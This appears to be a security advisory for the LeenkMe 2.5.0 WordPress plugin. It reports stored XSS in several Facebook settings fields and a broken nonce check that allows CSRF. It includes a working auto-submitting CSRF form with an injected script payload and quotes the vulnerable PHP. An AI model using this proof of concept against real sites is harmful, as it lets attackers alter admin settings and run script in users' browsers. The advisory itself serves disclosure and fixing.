plugin LeenkMe version 2.5.0.
 
 
In the page wp-content/plugins/leenkme/facebook.php
 
XSS vulnerable Fields are :
 
   - facebook_message
   - facebook_linkname
   - facebook_caption
   - facebook_description
   - default_image
   - _wp_http_referer
 
 
browser.
 
The Code for CSRF.html is
 
<html>
  <body onload="document.forms[&#039;xss&#039;].submit()" >
    <form name="xss" action="
http://127.0.0.1/wp/wp-admin/admin.php?page=leenkme_facebook" method="POST">
      <input type="hidden" name="facebook_profile" value="on" />
      <input type="hidden" name="fb_publish_wpnonce" value="" />
      <input type="hidden" name="_wp_http_referer" value="XSS" />
      <input type="hidden" name="facebook_message" value="XSS" />
      <input type="hidden" name="facebook_linkname" value="XSS" />
      <input type="hidden" name="facebook_caption" value="XSS" />
      <input type="hidden" name="facebook_description" value="
</textarea><script>prompt();</script>" />
      <input type="hidden" name="default_image" value="XSS" />
      <input type="hidden" name="clude" value="in" />
      <input type="hidden" name="publish_cats&#91;&#93;" value="0" />
      <input type="hidden" name="update_facebook_settings"
value="Save&#32;Settings" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>
 
 
The vulnerable page is
 
wp-content/plugins/leenkme/facebook.php
 
The vulnerable code producing XSS is
 
 
if ( !empty( $_REQUEST[&#039;facebook_message&#039;] ) )
$user_settings[&#039;facebook_message&#039;] = $_REQUEST[&#039;facebook_message&#039;];
else
$user_settings[&#039;facebook_message&#039;] = &#039;&#039;;
if ( !empty( $_REQUEST[&#039;facebook_linkname&#039;] ) )
$user_settings[&#039;facebook_linkname&#039;] = $_REQUEST[&#039;facebook_linkname&#039;];
else
$user_settings[&#039;facebook_linkname&#039;] = &#039;&#039;;
if ( !empty( $_REQUEST[&#039;facebook_caption&#039;] ) )
$user_settings[&#039;facebook_caption&#039;] = $_REQUEST[&#039;facebook_caption&#039;];
else
$user_settings[&#039;facebook_caption&#039;] = &#039;&#039;;
if ( !empty( $_REQUEST[&#039;facebook_description&#039;] ) )
$user_settings[&#039;facebook_description&#039;] = $_REQUEST[&#039;facebook_description&#039;];
 
 
-------------------------
-------------------------
-------------------------
snip
------------------------
-------------------------
--------------------------
 
<td><textarea name="facebook_message" style="width: 500px;"
maxlength="400"><?php
echo $user_settings[&#039;facebook_message&#039;]; ?></textarea></td>
                            </tr>
                            <tr>
                             <td><?php _e( &#039;Default Link Name:&#039;, &#039;leenkme&#039;
); ?></td>
                                <td><input name="facebook_linkname"
type="text" style="width: 500px;" value="<?php echo
$user_settings[&#039;facebook_linkname&#039;]; ?>"  maxlength="100"/></td>
                            </tr>
                            <tr>
                             <td><?php _e( &#039;Default Caption:&#039;, &#039;leenkme&#039; );
?></td>
                                <td><input name="facebook_caption"
type="text" style="width: 500px;" value="<?php echo
$user_settings[&#039;facebook_caption&#039;]; ?>" maxlength="100"/></td>
                            </tr>
                            <tr>
                             <td style=&#039;vertical-align: top; padding-top:
5px;&#039;><?php _e( &#039;Default Description:&#039;, &#039;leenkme&#039; ); ?></td>
                                <td><textarea name="facebook_description"
style="width: 500px;" maxlength="300"><?php echo
$user_settings[&#039;facebook_description&#039;]; ?></textarea></td>
 
 
The code used to protect against CSRF that is the anti csrf token used is
 
<?php wp_nonce_field( &#039;fb_publish&#039;, &#039;fb_publish_wpnonce&#039; ); ?>
 
 
But this code is not protecting against the CSRF, the form get submitted
successfully with out any error even though the fb_publish_wpnonce is kept
empty resulting in CSRF vulnerability.
 
 
 
# Author email: cor3sm4sh3r[at]gmail.com
# Contact: https://in.linkedin.com/in/cor3sm4sh3r
# Twitter: https://twitter.com/cor3sm4sh3r

